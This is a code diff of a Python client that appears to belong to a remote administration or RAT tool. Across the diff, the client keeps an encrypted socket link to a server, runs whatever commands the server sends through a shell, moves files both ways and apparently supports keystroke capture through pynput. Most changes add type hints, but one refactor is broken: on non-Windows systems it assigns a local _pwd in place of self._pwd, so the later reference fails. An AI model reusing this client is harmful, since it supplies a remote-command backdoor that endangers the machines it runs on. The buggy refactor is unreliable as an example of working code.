@@ -37,7 +37,8 @@ logging.basicConfig(filename=LOG, level=logging.INFO, format='%(asctime)s: %(mes
 logging.info('Client Started.')
 
 
-def read_file(path, block_size=1024):
+def read_file(path, block_size=1024) -> bytes:
+    """ Generator for reading files """
     with open(path, 'rb') as f:
         while True:
             piece = f.read(block_size)
@@ -47,7 +48,7 @@ def read_file(path, block_size=1024):
                 return
 
 
-def reverse_readline(filename, buf_size=8192):
+def reverse_readline(filename, buf_size=8192) -> str:
     """A generator that returns the lines of a file in reverse order"""
 
     # Credit: https://stackoverflow.com/a/23646049/10625567
@@ -76,14 +77,14 @@ def reverse_readline(filename, buf_size=8192):
             yield segment
 
 
-def Hasher(MESSAGE):
+def Hasher(MESSAGE) -> bytes:
     """ Hashes data """
     digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
     digest.update(MESSAGE)
     return digest.finalize()
 
 
-def verifySignature(publicKey, signature, message):
+def verifySignature(publicKey, signature, message) -> bool:
     """ Verify signature with public key """
     try:
         publicKey.verify(
@@ -100,7 +101,7 @@ def verifySignature(publicKey, signature, message):
         return False
 
 
-def sign(privateKey, data):
+def sign(privateKey, data) -> bytes:
     """ Sign data with private key """
     signature = privateKey.sign(
         data,
@@ -113,7 +114,7 @@ def sign(privateKey, data):
     return signature
 
 
-def encrypt(publicKey, plaintext):
+def encrypt(publicKey, plaintext) -> bytes:
     """ Encrypt using public key """
     ciphertext = publicKey.encrypt(
         plaintext,
@@ -125,7 +126,7 @@ def encrypt(publicKey, plaintext):
     return ciphertext
 
 
-def decrypt(privateKey, ciphertext):
+def decrypt(privateKey, ciphertext) -> bytes:
     """ Decrypt using private key """
     plaintext = privateKey.decrypt(
         ciphertext,
@@ -138,7 +139,7 @@ def decrypt(privateKey, ciphertext):
     return plaintext
 
 
-def public_bytes(publicKey):
+def public_bytes(publicKey) -> bytes:
     """ Get Public Key in Bytes """
     serializedPublic = publicKey.public_bytes(
         encoding=serialization.Encoding.PEM,
@@ -147,7 +148,8 @@ def public_bytes(publicKey):
     return serializedPublic
 
 
-def errors(ERROR, line=True):
+def errors(ERROR, line=True) -> str:
+    """ Error Handler """
     error_class = ERROR.__class__.__name__
     error_msg = '%s' % error_class
     try:
@@ -164,7 +166,7 @@ def errors(ERROR, line=True):
     return error_msg
 
 
-def kill(proc_pid):
+def kill(proc_pid) -> None:
     """ Kill Process by ID """
     process = psutil.Process(proc_pid)
     for proc in process.children(recursive=True):
@@ -172,7 +174,7 @@ def kill(proc_pid):
     process.kill()
 
 
-def json_dumps(data):
+def json_dumps(data) -> bytes:
     """ Dumps json data and encodes it """
     return json.dumps(data).encode()
 
@@ -199,7 +201,7 @@ if _pynput:
 
 class Client(object):
 
-    def __init__(self, host='127.0.0.1', port=9999):
+    def __init__(self, host='127.0.0.1', port=9999) -> None:
         self.serverHost = host
         self.serverPort = port
         self.socket = None
@@ -210,8 +212,12 @@ class Client(object):
 
         self.privateKey = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
         self.publicKey = self.privateKey.public_key()
+        if platform.system() == 'Windows':
+            self._pwd = ' & cd'
+        else:
+            _pwd = '; pwd'
 
-    def socket_create(self):
+    def socket_create(self) -> None:
         """ Create a socket """
         try:
             self.socket = socket.socket()
@@ -220,7 +226,7 @@ class Client(object):
             return
         return
 
-    def socket_connect(self):
+    def socket_connect(self) -> None:
         """ Connect to a remote socket using RSA and agreeing on a AES key"""
         try:
             self.socket.connect((self.serverHost, self.serverPort))
@@ -255,7 +261,7 @@ class Client(object):
         except Exception as e:
             logging.error(errors(e))
 
-    def recvall(self, n):
+    def recvall(self, n) -> bytes:
         """ Helper function to recv n bytes or return None if EOF is hit
         :param n:
         :param conn:
@@ -269,20 +275,20 @@ class Client(object):
             data += packet
         return data
 
-    def receive(self):
+    def receive(self) -> bytes:
         """ Receives Buffer Size and Data from Server Encrypted with AES """
         length = int(self.Fer.decrypt(self.socket.recv(2048)).decode())
         self.socket.send(b'<RECEIVED>')
         return self.Fer.decrypt(self.recvall(length))
 
-    def send(self, data):
+    def send(self, data) -> None:
         """ Sends Buffer Size and Data to Server Encrypted with AES """
         encrypted = self.Fer.encrypt(data)
         self.socket.send(self.Fer.encrypt(str(len(encrypted)).encode()))
         self.socket.recv(1024)
         self.socket.send(encrypted)
 
-    def send_file(self, file_to_transfer):
+    def send_file(self, file_to_transfer) -> None:
         """ Send file to Server """
         try:
             for line in read_file(file_to_transfer):
@@ -299,7 +305,7 @@ class Client(object):
             logging.info(errors(e))
         return
 
-    def receive_file(self, save_as):
+    def receive_file(self, save_as) -> None:
         """ Receive File from Server"""
         self.send(b'<RECEIVED>')
         with open(save_as, 'wb') as f:
@@ -313,7 +319,7 @@ class Client(object):
         logging.info('Transferred {} to Client'.format(save_as))
         return
 
-    def receive_commands(self):
+    def receive_commands(self) -> None:
         """ Receives Commands from Server """
         while True:
             data = json_loads(self.receive())
@@ -481,11 +487,7 @@ class Client(object):
                     continue
 
                 if data[1][:2].lower() == 'cd' or data[1][:5] == 'chdir':
-                    if platform.system() == 'Windows':
-                        _pwd = ' & cd'
-                    else:
-                        _pwd = '; pwd'
-                    process = subprocess.Popen(data[1] + _pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    process = subprocess.Popen(data[1] + self._pwd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                     error = process.stderr.read().decode()
                     if error == "":
                         output = process.stdout.read().decode()
@@ -517,7 +519,7 @@ class Client(object):
                     continue
 
 
-def main():
+def main() -> None:
     """ Run Client """
     client = Client()
     client.socket_create()
